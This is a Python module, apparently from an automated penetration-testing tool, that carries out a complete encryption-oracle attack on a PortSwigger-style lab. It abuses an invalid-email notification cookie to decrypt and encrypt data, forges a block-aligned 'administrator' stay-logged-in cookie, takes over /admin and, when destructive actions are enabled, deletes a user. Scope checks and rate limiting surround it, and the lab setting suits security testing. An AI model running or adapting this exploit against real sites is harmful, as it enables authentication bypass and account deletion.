"""
Encryption-oracle flow ("logic flaw that exposes an encryption oracle").

The site persists logins in a `stay-logged-in` cookie = base64(encrypt("user:ts")).
Posting a comment with an invalid email stores the error in a `notification` cookie
= base64(encrypt("Invalid email address: " + email)) and then *displays the
decrypted notification* - giving both an encryption oracle (attacker-controlled
plaintext via the email field) and a decryption oracle (plaintext reflected back).

Exploit: decrypt the stay-logged-in cookie to learn the "user:timestamp" format,
then use the encryption oracle to encrypt "<pad>administrator:<timestamp>" so the
fixed "Invalid email address: " prefix is block-aligned; drop the prefix blocks to
obtain ciphertext of "administrator:<timestamp>", and present it as stay-logged-in
to authenticate as administrator. Then delete the objective user.
"""

from __future__ import annotations

import base64
import logging
import re
from urllib.parse import quote, unquote

from ..core.scope import Scope, ScopeError
from ..engine.http_client import RateLimiter, ScopedClient
from ..testing.schema import Severity, TestCase, TestStep, VulnClass, Verdict

logger = logging.getLogger("venom.flows.encryption_oracle")

PREFIX = "Invalid email address: "
BS = 16
_CSRF = re.compile(r'name=["\']?csrf["\']?[^>]*?value=["\']?([^"\'\s>]+)')
_PLAIN = re.compile(r'([A-Za-z0-9_.-]+:\d{10,})')      # "user:timestamp"


def _csrf(t): m = _CSRF.search(t or ""); return m.group(1) if m else None
def _b64d(s): return base64.b64decode(unquote(s))
def _b64e(b): return base64.b64encode(b).decode()


def _find_comment(registry) -> str:
    for e in registry:
        if e.method.upper() == "POST" and "comment" in e.path.lower():
            return e.path
    return "/post/comment"


async def run(scope: Scope, registry, *, transport=None) -> list[TestCase]:
    if not scope.identities:
        return []
    auth = scope.identities[0].get("auth", {})
    username, password = auth.get("username"), auth.get("password")
    if not username or not password:
        return []
    login_url = auth.get("login_url", "/login")
    victim = scope.privileged_account or "administrator"
    base = scope.authorized_base_urls[0]
    comment_path = _find_comment(registry)
    limiter = RateLimiter(scope.rate_limit_per_second)

    def client(role):
        return ScopedClient(scope, base, role=role, limiter=limiter, transport=transport)

    steps: list[TestStep] = []
    try:
        c = client("oracle")
        lg = await c.request("GET", login_url)
        r = await c.request("POST", login_url, data={
            "csrf": _csrf(lg.text if lg else ""), "username": username,
            "password": password, "stay-logged-in": "1"}, follow_redirects=False)
        sc = dict(r.headers).get("set-cookie", "") if r else ""
        m = re.search(r"stay-logged-in=([^;]+)", sc)
        if not m:
            logger.info("encryption-oracle: no stay-logged-in cookie - skipping")
            return []
        sl_ct = _b64d(m.group(1))
        steps.append(TestStep(step=1, description=f"login (stay-logged-in); ct {len(sl_ct)} bytes",
                              method="POST", path=login_url))

        home = await c.request("GET", "/", follow_redirects=True)
        pm = re.search(r'postId=(\d+)', home.text if home else "")
        if not pm:
            logger.info("encryption-oracle: no blog post / comment surface - skipping")
            return []
        post = f"/post?postId={pm.group(1)}"
        pid = pm.group(1)

        async def decrypt(ct: bytes):
            # The lab intermittently 500s under load - retry the read a few times.
            for _ in range(4):
                c.set_auth(cookies={"notification": quote(_b64e(ct), safe="")})
                pg = await c.request("GET", post, follow_redirects=True)
                if pg is not None and pg.status_code == 200:
                    mm = _PLAIN.search(pg.text or "")
                    if mm:
                        return mm.group(1)
            return None

        async def encrypt(email: str) -> bytes:
            pg = await c.request("GET", post, follow_redirects=True)
            cm = await c.request("POST", comment_path, data={
                "csrf": _csrf(pg.text if pg else ""), "postId": pid, "comment": "x",
                "name": "x", "email": email, "website": ""}, follow_redirects=False)
            nv = re.search(r"notification=([^;]+)", dict(cm.headers).get("set-cookie", "") if cm else "")
            return _b64d(nv.group(1)) if nv else b""

        # Decrypt stay-logged-in to learn the "user:timestamp" format.
        plain = await decrypt(sl_ct)
        ts_m = re.search(r":(\d{10,})", plain or "")
        ts = ts_m.group(1) if ts_m else None
        if not ts:
            logger.info("encryption-oracle: could not read timestamp (got %r)", plain)
            return []
        target = f"{victim}:{ts}"
        steps.append(TestStep(step=2, description=f"decrypt stay-logged-in -> {plain}; forge '{target}'",
                              method="GET", path=post))

        # Encrypt with the prefix block-aligned, then drop the prefix blocks.
        pad = (BS - (len(PREFIX) % BS)) % BS
        drop = (len(PREFIX) + pad) // BS
        ct = await encrypt(("a" * pad) + target)
        forged = ct[drop * BS:]
        if not forged:
            logger.info("encryption-oracle: encryption oracle returned nothing - skipping")
            return []
        steps.append(TestStep(step=3, description=f"forge admin cookie (pad {pad}, drop {drop} blocks)",
                              method="POST", path=comment_path))

        # Authenticate as the privileged account with the forged cookie.
        a = client("oracle-admin")
        a.set_auth(cookies={"stay-logged-in": quote(_b64e(forged), safe="")})
        adm = await a.request("GET", "/admin", follow_redirects=False)
        adm_ok = adm is not None and adm.status_code == 200
        steps.append(TestStep(step=4, description="access /admin with forged stay-logged-in",
                              method="GET", path="/admin", actual_status=getattr(adm, "status_code", None)))
        if not adm_ok:
            logger.info("encryption-oracle: /admin not reachable (status=%s)",
                        getattr(adm, "status_code", None))
            await a.aclose()
            return []

        solved = False
        objective = scope.objective_delete_user
        if objective and scope.allow_destructive:
            dm = re.search(r'href=["\']([^"\']*delete[^"\']*username=)[^"\'&]*["\']', adm.text or "")
            delpath = (dm.group(1) + objective) if dm else f"/admin/delete?username={objective}"
            dr = await a.request("GET", delpath, follow_redirects=True, destructive=True)
            hm = await a.request("GET", "/", follow_redirects=True)
            solved = bool(hm and "is-solved" in (hm.text or ""))
            steps.append(TestStep(step=5, description=f"delete user '{objective}' (objective)",
                                  method="GET", path=delpath,
                                  actual_status=getattr(dr, "status_code", None), destructive=True))
        await a.aclose()

        note = ("LAB SOLVED (is-solved)" if solved else
                ("admin access achieved; destructive objective not run" if objective else
                 "admin access achieved"))
        verdict = Verdict.CONFIRMED_EXPLOIT if (adm_ok and (solved or not objective)) else Verdict.NEEDS_REVIEW
        return [TestCase(
            test_id="ENC-001",
            vulnerability_class=VulnClass.FAITH_BASED_RULE,
            hypothesis=("Encryption oracle: the comment 'invalid email' error encrypts attacker "
                        "input and reflects the decryption, so the stay-logged-in cookie can be "
                        f"forged to '{target}' via block-aligned prefix removal -> admin takeover."),
            risk_rating=Severity.CRITICAL,
            affected_endpoint=f"POST {comment_path} (oracle) -> GET /admin",
            business_impact="Authentication bypass to administrator via a cryptographic oracle.",
            steps=steps,
            origin="flow",
            verdict=verdict,
            notes=[note],
            rag_source="PortSwigger: encryption oracle / WSTG-CRYP-04",
        )]
    except ScopeError as exc:
        logger.warning("encryption-oracle blocked by scope: %s", exc)
        return []
    finally:
        try:
            await c.aclose()
        except Exception:  # noqa: BLE001
            pass
